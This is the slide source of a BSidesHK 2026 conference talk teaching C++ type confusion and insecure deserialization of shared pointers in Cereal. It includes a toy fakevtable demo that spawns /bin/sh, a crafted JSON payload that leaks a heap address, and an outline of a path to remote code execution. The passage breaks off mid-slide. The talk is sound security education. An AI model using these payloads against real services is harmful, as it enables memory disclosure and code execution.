---
theme: seriph
background: '#0a1628'
class: 'text-center'
highlighter: shiki
lineNumbers: false
drawings:
  persist: false
transition: slide-left
title: 'BSidesHK 2026 - Sharing is Caring - Introduction to Type Confusion by Exploiting C++ Shenanigans and Insecure Deserialization'
info: |
  ## Sharing is Caring: Introduction to Type Confusion by Exploiting C++ Shenanigans and Insecure Deserialization
  A talk presented in BSidesHK 2026.
comark: true
fonts:
  sans: 'Consolas, Inter, system-ui, -apple-system, sans-serif'
  mono: 'JetBrains Mono, IBM Plex Mono, Fira Code, monospace'
download: https://trebledj.me/talks/pdfs/bsideshk26.pdf
---

<Breadcrumbs />


# Sharing is Caring
## Introduction to Type Confusion by Exploiting C++ Shenanigans <br> and Insecure Deserialization

Johnathan Law (TrebledJ)

BSidesHK 2026

<style>
  p { opacity: 0.6; }
</style>

---
layout: four-column
hide: false
---

# Warmup: Find the odd one out!

<br>
<br>

::left::
## A.
![](/assets/warmup_shape_1.png)

::centerleft::
## B.
![](/assets/warmup_shape_2.png)

::centerright::
<div v-mark.box="{color: 'green'}">

## C.
![](/assets/warmup_shape_3.png)
</div>

::right::
## D.
![](/assets/warmup_shape_4.png)

---
layout: grid-4
hide: false
---

# Warmup: Find the odd one out!

::cell1::
<br><br>

## A. cuadrado
<br><br>

::cell2::
<br><br>

## B. square
<br><br>

::cell3::
<br>

## C. 正方形

::cell4::
<br>

## <span style="color:inherit" v-mark.circle="{color: 'green'}">D. lingkaran</span>

---
layout: grid-4
hide: false
---

# Warmup: Find the odd one out!

::cell1::
<br><br>

## A. 6 × 7
<br><br>

::cell2::
<br><br><br>
<div v-click.hide="2">

## <span style="color:inherit" v-mark.box="{color: 'green'}">B. 0x3a</span>
</div>
<br><br>

::cell3::
<br>

## C. `*`

::cell4::
<br>

## D. 42


---
layout: two-cols-header
---


# whoami

::left::
- Pentester and Red Teamer @DarkLab (PwC HK)
- CVEs across OT field controllers, web applications, and open source libraries
- C++ (and Programming) Enjoyer
- Side Quest Enjoyer
- Bubble Tea Enjoyer

<br>
<br>

::right::
![](/assets/trebledj-circle.png){style="width:40%; justify-self: center;"}

TrebledJ{style="justify-self: center"}

<br>

<style>
.two-cols-header {
  grid-template-rows: auto 1fr auto;
  align-items: center;
  gap: 0;
}

.slidev-layout {
  padding-right: 8rem;
}
</style>

---
layout: default
---

# Setting Expectations

- Learning type confusion
- Not a deep dive into browser exploitation
- Nerd out on C++ shenanigans
  - Assume everything in this talk is `std::` unless otherwise scoped
  - `string` instead of `std::string`
- A novel (niche?) subclass(?), a few CVEs
- Side quests:
  - Thinking critically about threat models
  - Help you make life-changing decisions <sub>(in choosing bubble tea)</sub>


---
layout: default
---

# Why talk about type confusion?

- Side quest from last year: What would deserialization attacks on C++ look like?
- I like C++
- "It's interesting"
- But also...

---
layout: fact
---

# 2nd Most Exploited
### CWE-843: Access of Resource Using Incompatible Type, "Type Confusion"

<!-- 
1st: Out-of-Bounds Write

3rd/4th: Command/Code Injection

5th: Insecure Deserialization
-->

[Source: Top 10 KEV Weaknesses (2024)](https://cwe.mitre.org/top25/archive/2024/2024_kev_insights.html)

<sub>KEV = Known Exploited Vulnerabilities</sub>

---
layout: default
---

# ...and still relevant in 2026

<div style="width: 60%; justify-self: center;">

![](/assets/claude-firefox-bug.png){style="margin-left: 40px"}

</div>


---
layout: agenda
---

# Agenda

<!-- - **Introduction**  <span class="desc">Warmup, whoami, why?</span> -->

- **What is Type Confusion?**  <span class="desc">Terms, primitives, examples</span>
- **Insecure Deserialization of Pointers**  <span class="desc">Applying type confusion for great good</span>
- **Concluding Topics**  <span class="desc">Mitigations, Further Research, Does Rust help?, Best bubble tea???</span>

<!--
Agenda/Table of Contents with numbered list with a custom layout.
-->

---
layout: section
---

# Let's Talk About Type Confusion

---
layout: image-right
image: /assets/deserialization_meme_69.png
backgroundSize: contain
part: Type Confusion
---

# What is Type Confusion?

- High Level: Code interprets data as a type not intended
- Low Level: Pointers mixing with data.
<v-click>

- Predominantly seen in browser exploits
- Primitives:
  1. Address Leak
  2. Memory Read
  3. Memory Write
  4. fakevtable
</v-click>
<v-click>

- Addr Leak $\rightarrow$ Mem Read $\rightarrow$ stronger primitive
</v-click>

<!-- 
---
layout: default
part: Type Confusion
---

# Note on Nomenclature

<RibbonBanner text="Side Quest" color="yellow" />

| Primitive  | What it does                                                               | To achieve                       |
|------------|----------------------------------------------------------------------------|--------------------------------|
| addorf     | Get the *address of* a JS object                                           | Address Leak (ASLR Bypass)     |
| fakeobj    | Create a fake JS object pointing to attacker-controlled memory                  | Memory R/W                     |
| fakevtable | Create a fake object with an attacker-controlled <br> v-pointer to a fake Virtual Table (VTable)| Arbitrary Code Execution (ACE) |

You will see "addrof" and "fakeobj" used more in browser exploitation literature.

Also:
- ACE = Arbitrary Code Execution
- R/W = Read/Write -->

<!-- Yee -->

---
layout: two-cols-header
# image: /assets/address-me.png
# backgroundSize: 90%
part: Type Confusion
section: Address Leak
---

# Address Leak

<RibbonBanner text="Example" color="green" />

::left::

Here's some C++ code which creates a string and "simulates" a type confusion by casting it to a `uint64_t`:

```cpp {all|1-2|8-9}
string s = "Hello world! ABCDEFGH";
cout << s << endl;

uint64_t cast_to_u64(string& s) {
    return *reinterpret_cast<uint64_t*>(&s);
}

uint64_t i = cast_to_u64(s); // Simulate a type confusion
cout << i << endl;
```

```cpp {all|1|2}{at:0}
Hello world! ABCDEFGH
140726213362192    // 0x7ffd5ff54210
```

What is going on?


::right::

<br>
<br>

![](/assets/address-me.png){style="width: 90%; justify-self: center"}

<!--
cast = not important right now

Casting from memory perspective
-->

---
layout: two-cols-header-upper
part: Type Confusion
section: Address Leak
---

# What is going on?

<RibbonBanner text="Example" color="green" />

::left::
```cpp
struct string {     // gcc, x64 Linux
  char* buffer;     // 8 bytes
  size_t size;      // 8 bytes
  size_t capacity;  // 8 bytes
}
```

::right::
```cpp
string s = "Hello world! ABCDEFGH";
cout << s << endl;

uint64_t i = cast_to_u64(s);
cout << i << endl; // 0x7ff...210
```

::bottom::
<div v-click=1>
<TypeConfusionTable 
  actualTypeOverall="string"
  confusedTypeOverall="uint64_t"
  :rows="[
    { field: 'buffer', confusedField: 'i', size: 8, value: '[0x7ff...210] -> \u0022Hello...\u0022', color: 'yellow', actualType: 'char*', confusedType: 'uint64_t' },
    { field: 'size', size: 8, value: '21', color: 'blue', actualType: 'size_t' },
    { field: 'capacity', size: 8, value: '21', color: 'blue', actualType: 'size_t' },
  ]"
/>
</div>

<div v-click=2>

High Level: confuse `string` with `uint64_t`.  
Low Level: confuse `char*` with `uint64_t`.
</div>

<!-- The pointer is treated as data. To have an address leak, we need to: (1) identify such a type confusion, and (2) obtain the data somehow (printed out, sent over the wire, etc). -->

<!-- 
The data is fixed and doesn't change.
But because the program thinks it is a number, a different set of code (a different overload) runs.
And the assembly will treat that memory as a number rather than a string.
 -->


---
layout: image-right
image: /assets/trade_offer_addr.png
backgroundSize: 80%
part: Type Confusion
section: Address Leak
---

# Great Book o' Conditions

Address Leak:
<mdi-check/> Type Confusion (pointer confused for data)
<br>
<mdi-check/> Output

<br><br>
What can you do with a leaked address?
<v-click>

Not a lot... but still useful!
</v-click>

<!--

-->

---
layout: two-cols-header-upper
part: Type Confusion
section: Memory Read
---

# Arbitrary Memory Read

<RibbonBanner text="Example" color="green" />

::left::
<v-click at=1>

```cpp
struct Foo { uint64_t i, j, k; };
// structurally the same as uint64_t[3]

Foo f = Foo{0x7ffabc000, 64, 0};
string s = cast_to_string(f);
cout << s << endl; // <-- read happens here
```
</v-click>
<!-- // prints 64 bytes at 0x7ffabc000 -->

::right::
<v-click at=3>

```cpp
// When you print a string...
auto buffer = s.data();
for (size_t i = 0; i < s.size(); i++)
  print(*(buffer + i));
```
</v-click>

<!-- <br/> -->

::bottom::

<div v-click=2>
<TypeConfusionTable 
  actualTypeOverall="Foo"
  confusedTypeOverall="string"
  :rows="[
    { field: 'f.i', confusedField: 'buffer', size: 8, value: '0x7ffabc000', color: 'yellow', actualType: 'uint64_t', confusedType: 'char*' },
    { field: 'f.j', confusedField: 'size', size: 8, value: '64', color: 'blue', actualType: 'uint64_t', confusedType: 'size_t' },
    { field: 'f.k', confusedField: 'capacity', size: 8, value: '0', color: 'blue', actualType: 'uint64_t', confusedType: 'size_t' },
  ]"
/>
</div>

<div v-click=4>

High Level: Confuse `uint64_t[3]` for a `string`.  
Low Level: Control `char*`.
</div>

<!-- To have arbitrary memory read, we need to: (1) identify such a type confusion, and (2) control a pointer by proxy of some data, which is treated as an array of bytes/chars. Here we assume control of `f.i` to control the string's `buffer`. -->

---
layout: image-right
image: /assets/spiderman-meme-1.avif
backgroundSize: 80%
part: Type Confusion
section: Memory Read
---

# Great Book o' Conditions

<div style="opacity:0.3;">

Address Leak:
<mdi-check/> Type Confusion (pointer confused for data)
<br>
<mdi-check/> Output
</div>

Arbitrary Memory Read:
<mdi-check/> Type Confusion (control a pointer)
<br>
<mdi-check/> Dereference Pointer and Read Data
<br>
<mdi-check/> Output

<!--
skip mem write
-->

---
layout: image-left
image: /assets/vtables.png
backgroundSize: contain
part: Type Confusion
section: fakevtable
---

# What is a VTable?

<RibbonBanner text="ㅤShenanigans" color="blue" />

```cpp
class B {
public:
  virtual void bar();
  virtual void qux();
};

class C : public B {
public:
  void bar() override;
}

B b; b.bar(); b.qux();
C c; c.bar(); c.qux();
```

<v-clicks>

1. Virtual classes are classes with virtual functions.
2. Each virtual class also has a v-table (1 per class) which is an array of function pointers.
3. Virtual classes have a hidden pointer known as the v-pointer (1 per object).
</v-clicks>


---
layout: two-cols-header-upper
part: Type Confusion
section: fakevtable
---

# fakevtable

<RibbonBanner text="Example" color="green" />

::left::

````md magic-move
```cpp
void win() {
  system("/bin/sh");
}

struct Square {
  uint64_t length;
  void print_len() { cout << "len is " << length << "\n"; }
  virtual void draw() { cout << "☐\n"; }
};

int main() {
  Square* s = new Square;
  s->length = 4;
  s->print_len();
  s->draw();
  delete s;
```

```cpp {11}
void win() {
  system("/bin/sh");
}

struct Square {
  uint64_t length;
  void print_len() { cout << "len is " << length << "\n"; }
  virtual void draw() { cout << "☐\n"; }
};

void* fake_vtable[] = {(void*)&win}; // Array of addresses

int main() {
  Square* s = new Square;
  s->length = 4;
  s->print_len();
  s->draw();
  delete s;
```

```cpp {11-16}
void win() {
  system("/bin/sh");
}

struct Square {
  uint64_t length;
  void print_len() { cout << "len is " << length << "\n"; }
  virtual void draw() { cout << "☐\n"; }
};

void* fake_vtable[] = {(void*)&win}; // Array of addresses

uint64_t fake_square[2] = {
  (uint64_t)&fake_vtable,  // fake Square.vptr
  42,                      // fake Square.length
};

int main() {
  Square* s = new Square;
  s->length = 4;
  s->print_len();
  s->draw();
  delete s;
```

```cpp {11-16,19}
void win() {
  system("/bin/sh");
}

struct Square {
  uint64_t length;
  void print_len() { cout << "len is " << length << "\n"; }
  virtual void draw() { cout << "☐\n"; }
};

void* fake_vtable[] = {(void*)&win}; // Array of addresses

uint64_t fake_square[2] = {
  (uint64_t)&fake_vtable,  // fake Square.vptr
  42,                      // fake Square.length
};

int main() {
  Square* s = reinterpret_cast<Square*>(&fake_square);
  s->print_len();
  s->draw();
```

```cpp {7,11-16,19-20}
void win() {
  system("/bin/sh");
}

struct Square {
  uint64_t length;
  void print_len() { cout << "len is " << length << "\n"; }
  virtual void draw() { cout << "☐\n"; }
};

void* fake_vtable[] = {(void*)&win}; // Array of addresses

uint64_t fake_square[2] = {
  (uint64_t)&fake_vtable,  // fake Square.vptr
  42,                      // fake Square.length
};

int main() {
  Square* s = reinterpret_cast<Square*>(&fake_square);
  s->print_len();
  s->draw();
```

```cpp {1-3,11-16,19,21}
void win() {
  system("/bin/sh");
}

struct Square {
  uint64_t length;
  void print_len() { cout << "len is " << length << "\n"; }
  virtual void draw() { cout << "☐\n"; }
};

void* fake_vtable[] = {(void*)&win}; // Array of addresses

uint64_t fake_square[2] = {
  (uint64_t)&fake_vtable,  // fake Square.vptr
  42,                      // fake Square.length
};

int main() {
  Square* s = reinterpret_cast<Square*>(&fake_square);
  s->print_len();
  s->draw();
```
````
<!-- 
#### Key Point: We control an object's vpointer.

To exploit this, we:

1. create a fake vtable (literally),
2. place it somewhere in memory,
3. then use our controlled vpointer to point to it. -->

::right::

````md magic-move {at:4}
```
len is 4
☐
```
```
len is 42
☐
```
```
len is 42
$ id
uid=1000(user) gid=1000(user) groups=1000(user)
```

````

<v-clicks at=1>

1. Create a fake vtable (literally) containing an address we want to jump to
2. Create a fake object where vpointer $\rightarrow$ the fake vtable
3. Type confuse the fake object

</v-clicks>

![](/assets/vtables.png)

<!-- 
objective: call win
 -->


---
layout: two-cols-header-upper
part: Type Confusion
section: fakevtable
---

# fakevtable

<RibbonBanner text="Example" color="green" />

::left::

```cpp
void* fake_vtable[] = {(void*)&win};

uint64_t fake_square[2] = {
  (uint64_t)&fake_vtable,  // fake Square.vptr
  42,                      // fake Square.length
};
```

::right::
```cpp
struct Square {
  uint64_t length;
  void print_len() { cout << "len is " << length << "\n"; }
  virtual void draw() { cout << "☐\n"; }
};
```

::bottom::
<br/>
<TypeConfusionTable 
  actualTypeOverall="uint64_t[2]"
  confusedTypeOverall="Square"
  :rows="[
    { field: '[0]', confusedField: 'vptr', size: 8, value: '&fake_vtable', color: 'yellow', actualType: 'uint64_t', confusedType: 'function**' },
    { field: '[1]', confusedField: 'length', size: 8, value: '42', color: 'blue', actualType: 'uint64_t', confusedType: 'uint64_t' },
    // { field: 'f.k (capacity)', size: 8, value: '0', color: 'green', actualType: '-', confusedType: 'size_t (uint64_t)' },
  ]"
/>

<!-- In short, if we control the `vptr` $\Rightarrow$ we control the instruction pointer $\Rightarrow$ arbitrary code execution. -->

---
layout: image-right
image: /assets/fakevnews.png
backgroundSize: 80%
part: Type Confusion
section: fakevtable
---

# Great Book o' Conditions

<div style="opacity:0.3;">

Address Leak:
<mdi-check/> Type Confusion (pointer confused for data)
<br>
<mdi-check/> Output

Arbitrary Memory Read:
<mdi-check/> Type Confusion (control a pointer)
<br>
<mdi-check/> Dereference Pointer and Read Data
<br>
<mdi-check/> Output

</div>

fakevtable:
<mdi-check/> Have fake vtable
<br>
<mdi-check/> Type Confusion (control v-pointer)
<br>
<mdi-check/> Call virtual function

---
layout: section
---

# Type Confusion & <br> Insecure Deserialization of Pointers in C++

---
layout: default
part: Insecure Deserialization of Pointers in C++
---

# Comparison to Type Confusion in Browsers

| **Feature** | **Browser JS Engines** | **Insecure Deserialization in this talk** |
| :--- | :--- | :--- |
| **Threat Model** | Memory corruption caused by <span v-mark.underline.orange>allocations/assumptions</span> of JS objects | Memory corruption caused by <span v-mark.underline.orange="{at:'0', multiline:true}">deserializing attacker-controlled data</span> |
| **Payload&nbsp;Format** | JavaScript | Serialized Data (Binary/JSON/XML/etc) |
| **Round-Trips** | <span v-mark.underline.blue>One single JS payload</span> is enough | <span v-mark.underline.blue=2>Multiple round-trips</span> required for successful exploitation |
| **Reliability** | Dependent on engine | Dependent on library usage ("gadgets") |

<!-- | **Attack Vector** | Crafted JavaScript forces the JIT to mishandle object types | Crafted payload deserializes into wrong types | -->
<!-- 
Important distinctions:

The threat model also includes integer overflow, negative indexing, etc. Not limited to just type confusion.

Whether the bug depends on how the serialization library (or whether it should be treated as gadgets)... this depends on whether the bug is located in a subset of serialization payloads or in all payloads.

-->


---
layout: default
part: Insecure Deserialization of Pointers in C++
---

# Comparison to Other Deserialization Libraries
<!-- 
| **Feature** | **C++ Library (e.g.&nbsp;Cereal/Boost)** | **PHP `unserialize`** | **.NET `BinaryFormatter`** |
| :--- | :------- | :--- | :--- |
| **Nature of Data** | Binary, XML, JSON | String | Binary |
| **Supports Serialization of Pointers/References** | Yes | Yes | Yes |
| **Supports Dynamic Reflection / Class Lookup / Deserialization of Arbitrary Classes** | No, requires compile-time knowledge of types | **Yes**, any class in the application (unless restricted via `allowed_classes`) | **Yes**, any type in the current AppDomain |
| **Threat Model** | Untrusted data | Untrusted data | Untrusted data |
| **Primitives** | R/W Memory, ACE | R/W File, ACE | R/W File, ACE | -->

<table border="1" cellpadding="8" cellspacing="0" style="border-collapse: collapse; width: 100%; font-family: sans-serif;">
  <thead>
    <tr>
      <th style="text-align: left; width: 20%;"><strong>Feature</strong></th>
      <th style="text-align: left; width: 15%;"><strong>PHP <code>unserialize</code></strong></th>
      <th style="text-align: left; width: 15%;"><strong>.NET <code>BinaryFormatter</code></strong></th>
      <th style="text-align: left; width: 27%;"><strong>Platform-Agnostic Libraries <span style="font-weight: normal; font-size: 0.9em;">(e.g. protobuf)</span></strong></th>
      <th style="text-align: left; width: 30%;"><strong>Libraries in this talk<br><span style="font-weight: normal; font-size: 0.9em;">(e.g. Cereal/Boost)</span></strong></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><strong>Threat Model</strong></td>
      <td colspan="4">Deserialization of untrusted data</td>
    </tr>
    <tr>
      <td><strong>Payload Format</strong></td>
      <td>Text</td>
      <td>Binary</td>
      <td>Binary, JSON</td>
      <td>Binary, Text (XML, JSON)</td>
    </tr>
    <tr>
      <td><strong>Serialization of References</strong></td>
      <td colspan="2">Yes</td>
      <td><span v-mark.underline.red>No</span></td>
      <td><span v-mark.circle.green="{at:1}">Yes</span></td>
    </tr>
    <tr>
      <td><strong>Deserialization of Arbitrary Classes</strong></td>
      <td colspan="2">Yes</td>
      <td colspan="2"><span v-mark.underline.red>No, requires compile-time knowledge of types</span></td>
    </tr>
    <tr>
      <td><strong>Primitives</strong></td>
      <td colspan="2">File R/W, ACE</td>
      <td colspan="2">Address Leak, Memory R/W, fakevtable</td>
    </tr>
  </tbody>
</table>

<style>
  td:not(:first-child) {
    text-align: center;
  }
</style>


---
layout: agenda
part: Insecure Deserialization of Pointers in C++
---

# Subtopics

- **Understanding Pointer Serialization** <span class="desc">Shared Pointers, and how are refs serialised?</span>
- **Type Confusion via Shared Pointers**
- **Ownership Confusion with Unique Pointers**
- **Zero-Copy Deserialization**



---
layout: two-cols-header
part: Insecure Deserialization of Pointers in C++
section: Understanding Pointer Serialization
---

# Who uses pointer serialization?

<RibbonBanner text="Side Quest" color="yellow" />

<!-- Key distinction: C++ Serialization Libraries ***which support pointer serialization*** -->

::left::
Various industries, depending on business/performance need:
- Cryptocurrency (e.g. Monero)
- High-Performance Computing
- Robotics, IoT
- Finance
- Science
- Decentralised/Distributed Systems

::right::

![](/assets/targets_monero.png){.target-img .img2}
![](/assets/targets_walle.avif){.target-img .img1}
![](/assets/targets_stonks.jpg){.target-img .img3}

<style>
  .target-img {
    position: absolute;
  }
  .img1 {
    width: 40%;
    top: 13%;
    right: 2%;
  }
  .img2 {
    width: 20%;
    top: 40%;
    right: 40%;
  }
  .img3 {
    width: 30%;
    right: 10%;
    bottom: 2%;
  }
</style>
<!-- 
Examples:
- **Boost Serialization**. Boost is a popular C++ library which extends the standard library with various classes and features. Boost *Serialization* is one of its modules, which supports versioning, multiple archive formats (binary, text, XML), and serialization of types in the standard library.

<br>

- **HPX** is an implementation of the C++ standard template library (STL) designed for high-performance computing (HPC). HPX *Serialization* is a module for message passing across a distributed system. -->

---
layout: two-cols-header
part: Insecure Deserialization of Pointers in C++
section: Understanding Pointer Serialization
---

# Shared Pointers

<RibbonBanner text="ㅤShenanigans" color="blue" />

::left::

```cpp {1-6|9-10|12-16|18-19|20-21}
class Resource {
public:
    Resource() { cout << "Resource acquired\n"; }
    ~Resource() { cout << "Resource destroyed\n"; }
    void use() { cout << "Resource used\n"; }
};

int main() {
    // Create a shared_ptr that manages a new Resource
    shared_ptr<Resource> ptr1 = make_shared<Resource>();
    {
        // Create another shared_ptr that shares ownership
        shared_ptr<Resource> ptr2 = ptr1;
        cout << "Inside inner scope - ";
        ptr2->use(); // Both pointers can use the resource
        // ptr2 will be destroyed here, but resource remains alive
    }
    cout << "Outside inner scope - ";
    ptr1->use(); // ptr1 can still use the resource
    return 0;
    // ptr1 destroyed here → reference count reaches 0 → resource destroyed
}
```

::right::

<v-clicks>

- Reference-counted smart pointer
- Multiple (shared) ownership
  - When one owner goes bye bye, the other owner(s) keep the resource alive
  - The resource is only destroyed only when the ***last*** owner goes bye bye
- Similar to `Rc` in Rust
</v-clicks>

<br/>
<!-- <br/> -->

````md magic-move {at:1}
```
```
```
Resource acquired
```
```
Resource acquired
Inside inner scope - Resource used
```
```
Resource acquired
Inside inner scope - Resource used
Outside inner scope - Resource used
```
```
Resource acquired
Inside inner scope - Resource used
Outside inner scope - Resource used
Resource destroyed
```
````


---
layout: two-cols-header
# layout: image-right
# image: /assets/deserialization_diagram_example_serialization_no_code_seq_0.png
# backgroundSize: contain
# transition: fade
part: Insecure Deserialization of Pointers in C++
section: Understanding Pointer Serialization
---

# Serialization of Pointers/References

<RibbonBanner text="Example" color="green" />

::left::

<br/>

Problem: We want to serialize pointers.

How to serialize C?

<br/>
<!-- <br/> -->

```cpp
struct Node {
  string data;
  vector<shared_ptr<Node>> children;
};
vector<shared_ptr<Node>> roots;
// -- Snip: Add nodes... --
serialize(roots);
```
<br>
<v-clicks>

- Use `id` to uniquely identify objects
- Reference existing objects using *just* an `id`
</v-clicks>

::right::
<v-switch at=0>
<template #0>

![](/assets/deserialization_diagram_example_serialization_no_code_seq_0.png)

</template>
<template #1>

![](/assets/deserialization_diagram_example_serialization_no_code_seq_1.png)

</template>
<template #2>

![](/assets/deserialization_diagram_example_serialization_no_code_seq_2.png)

</template>
</v-switch>

<style>
  img {
    margin-top: -1rem;
    transform: scale(120%);
  }
  .two-cols-header {
    column-gap: 2rem;
  }
</style>


---
layout: section
part: Insecure Deserialization of Pointers in C++
---

# Type Confusion via Shared Pointers

---
layout: two-cols-header
part: Insecure Deserialization of Pointers in C++
section: Type Confusion via Shared Pointers
---

# "Cerealizing" Shared Pointers

<RibbonBanner text="Example" color="green" />

<!-- Let's see how Cereal handles shared pointers! -->
<!-- Note: `+ 2^31` is used on ID's which are serialized for the first time. -->
<v-switch>
  <template #0-5> How does Cereal handle shared pointers? </template>
  <template #5-7> Okay, but what if we use different types? </template>
  <template #7-9> Big brain moment: What if we force the second pointer to share the first? </template>
</v-switch>

::left::
````md magic-move {at:2}
```cpp {1-4|7-10|12-13|all}
struct Person {
  string name;
  string address;
};

void serialize() {
  shared_ptr<Person> p1 = 
    make_shared<Person>(Person{"Mickey", "Disney World"});
  
  shared_ptr<Person> p2 = p1;
  
  cereal::JSONOutputArchive archive(cout);
  archive(CEREAL_NVP(p1), CEREAL_NVP(p2));
}
```

```cpp {1-9}
struct Person {
  string name;
  string address;
};

struct Phone {
  string name;
  uint64_t number;
};

void serialize() {
  shared_ptr<Person> p1 = 
    make_shared<Person>(Person{"Mickey", "Disney World"});
  
  shared_ptr<Person> p2 = p1;
  
  cereal::JSONOutputArchive archive(cout);
  archive(CEREAL_NVP(p1), CEREAL_NVP(p2));
}
```

```cpp {6-9,15-16|6-9,15-16|6-9,15-16}
struct Person {
  string name;
  string address;
};

struct Phone {
  string name;
  uint64_t number;
};

void serialize() {
  shared_ptr<Person> p1 = 
    make_shared<Person>(Person{"Mickey", "Disney World"});
  
  shared_ptr<Phone> p2 = 
    make_shared<Phone>(Phone{"Mickey's Phone", 12345678});
  
  cereal::JSONOutputArchive archive(cout);
  archive(CEREAL_NVP(p1), CEREAL_NVP(p2));
}
```
````

::right::
````md magic-move {at:6}
```json
{
    "p1": {
        "ptr_wrapper": {
            "id": 1 + 2^31,
            "data": {
                "name": "Mickey",
                "address": "Disney World"
            }
        }
    },
    "p2": {
        "ptr_wrapper": {
            "id": 1
        }
    }
}
```

```json
{
    "p1": {
        "ptr_wrapper": {
            "id": 1 + 2^31,
            "data": {
                "name": "Mickey",
                "address": "Disney World"
            }
        }
    },
    "p2": {
        "ptr_wrapper": {
            "id": 2 + 2^31,
            "data": {
                "name": "Mickey's Phone",
                "number": 12345678
            }
        }
    }
}
```

```json
{
    "p1": {
        "ptr_wrapper": {
            "id": 1 + 2^31,
            "data": {
                "name": "Mickey",
                "address": "Disney World"
            }
        }
    },
    "p2": {
        "ptr_wrapper": {
            "id": 1
        }
    }
}
```
````

<div v-click="8" style="justify-self: center;">

# BOOM!

</div>

---
layout: two-cols-header
part: Insecure Deserialization of Pointers in C++
section: Type Confusion via Shared Pointers
---

# De-Cereal-izing

<RibbonBanner text="Example" color="green" />

::left::

Payload:
````md magic-move {at:1}
```json {11-19}
{
    "p1": {
        "ptr_wrapper": {
            "id": 1 + 2^31,
            "data": {
                "name": "Mickey",
                "address": "Disney World"
            }
        }
    },
    "p2": {
        "ptr_wrapper": {
            "id": 2 + 2^31,
            "data": {
                "name": "Mickey's Phone",
                "number": 12345678
            }
        }
    }
}
```

```json {11-15|11-15}
{
    "p1": {
        "ptr_wrapper": {
            "id": 1 + 2^31,
            "data": {
                "name": "Mickey",
                "address": "Disney World"
            }
        }
    },
    "p2": {
        "ptr_wrapper": {
            "id": 1
        }
    }
}
```
````

::right::

Code/Output:
```cpp {none}
shared_ptr<Person> p1;
shared_ptr<Phone> p2;

cereal::JSONInputArchive archive(cin);
archive(CEREAL_NVP(p1), CEREAL_NVP(p2));

cout << hex;
cout << "p1: " << p1->name 
          << ", " << p1->address 
          << endl;
cout << "p2: " << p2->name 
          << ", " << p2->number 
          << endl;
```

<!-- Output: -->
````md magic-move {at:1}
```
p1: Mickey, Disney World
p2: Mickey's Phone, 12345678
```

```
p1: Mickey, Disney World
p2: Mickey, 0x55c65a115c70
```
````

<div v-click="2">Woah! We got a heap address!</div>

---
layout: two-cols-header-upper
part: Insecure Deserialization of Pointers in C++
section: Type Confusion via Shared Pointers
---

# What happened?

<RibbonBanner text="Example" color="green" />

We forced `shared_ptr<Phone> p2` to point to a `Person` instead of a `Phone`...

Since `p2` now points to `Person`, printing `p2->number` gives us the buffer of `p1->address`.

::left::
```cpp
struct Person {
  string name;
  string address;
```

::right::
```cpp
struct Phone {
  string name;
  uint64_t number;
```

::bottom::
<TypeConfusionTable 
  actualTypeOverall="Person"
  confusedTypeOverall="Phone"
  :rows="[
    { field: 'name', confusedField: 'name', size: 32, value: '\u0022Mickey\u0022', color: 'blue', actualType: 'string', confusedType: 'string' },
    // { field: 'address (number)', size: 32, value: '\u0022Disney World\u0022', color: 'blue', actualType: 'string', confusedType: 'uint64_t' },
    { field: 'address.buffer', confusedField: 'number', size: 8, value: '[ 0x55c65a115c70] -> \u0022Disney World\u0022', color: 'yellow', actualType: 'char*', confusedType: 'uint64_t' },
    { field: 'address.size', size: 8, value: '12', color: 'blue', actualType: 'uint64_t', confusedType: '' },
    { field: 'address.capacity', size: 8, value: '12', color: 'blue', actualType: 'uint64_t', confusedType: '' },
    // { field: 'f.k (capacity)', size: 8, value: '0', color: 'blue', actualType: 'uint64_t', confusedType: 'size_t (uint64_t)' },
  ]"
/>


---
layout: default
part: Insecure Deserialization of Pointers in C++
section: Type Confusion via Shared Pointers
---

# Okay, but how to RCE?

We just demonstrated an address leak primitive in Cereal.

1. Address Leak --> Get a stack/heap address.
2. Memory Read --> Read libc addresses, etc.
3. fakevtable --> Control the instruction pointer --> ROP/JOP --> `system("/bin/sh")`

Mileage varies: **highly dependent on "gadgets"**.


<!-- Using different types, it is also possible to achieve other primitives. Some examples are:

- arbitrary memory read: `shared_ptr<uint64_t>` (actual) -> `shared_ptr<string>` (confused)
- fakevtable (ACE): `shared_ptr<uint64_t>` (actual) -> `shared_ptr<VirtualClass>` (confused) -->


<!-- What about arbitrary memory WRITE? -->
<!-- - Assumption: Deserialized payload is `const` -->


---
layout: grid-4
part: Insecure Deserialization of Pointers in C++
section: Type Confusion via Shared Pointers
---

# Which of these best give us Memory Read in Cereal?

<RibbonBanner text="Exercise" color="purple" />

::cell1::
Assume an application deserializes untrusted data.
```cpp
shared_ptr</* ??? */> a;
shared_ptr</* ??? */> b;
cereal::JSONInputArchive archive(cin);
archive(CEREAL_NVP(a), CEREAL_NVP(b));
```

::cell2::

```cpp
struct string {
  char* buffer;
  size_t size;
  size_t capacity;
}
```

::cell3::
## A
```cpp
shared_ptr<uint64_t> a;
shared_ptr<string> b;
```

## C
```cpp
struct FakeNews {
  uint64_t number;
  virtual void func() {}
};
shared_ptr<FakeNews> a; shared_ptr<string> b;
```

::cell4::
## B
```cpp
shared_ptr<string> a;
shared_ptr<string> b;
```

## D

<div v-mark.box="{color: 'green'}">

```cpp
struct TwinTower { uint64_t x, y; };
shared_ptr<TwinTower> a;
shared_ptr<string> b;
```
</div>

---
layout: two-cols-header-upper
part: Insecure Deserialization of Pointers in C++
section: Type Confusion via Shared Pointers
---

# Memory Read in Cereal

<RibbonBanner text="Example" color="green" />

::left::
````md magic-move
```cpp
// A
shared_ptr<uint64_t> a;
shared_ptr<string> b;
```
```cpp
// B
shared_ptr<string> a;
shared_ptr<string> b;
```
```cpp
// C
struct FakeNews {
  uint64_t number;
  virtual void func() {}
};
shared_ptr<FakeNews> a;
shared_ptr<string> b;
```
```cpp
// D
struct TwinTower { uint64_t x, y; };
shared_ptr<TwinTower> a;
shared_ptr<string> b;
```
````

::right::


::bottom::
<div v-click.hide="1">
<TypeConfusionTable 
  actualTypeOverall="uint64_t"
  confusedTypeOverall="string"
  :rows="[
    { field: '', confusedField: 'buffer', size: 8, value: '(controllable)', color: 'red', actualType: 'uint64_t', confusedType: 'char*' },
    { field: '', confusedField: 'size', size: 8, value: '', color: 'blue', actualType: '', confusedType: 'size_t' },
    { field: '', confusedField: 'capacity', size: 8, value: '', color: 'blue', actualType: '', confusedType: 'size_t' },
  ]"
/>
</div>
<div v-click="[1, 2]">
<TypeConfusionTable 
  actualTypeOverall="string"
  confusedTypeOverall="string"
  :rows="[
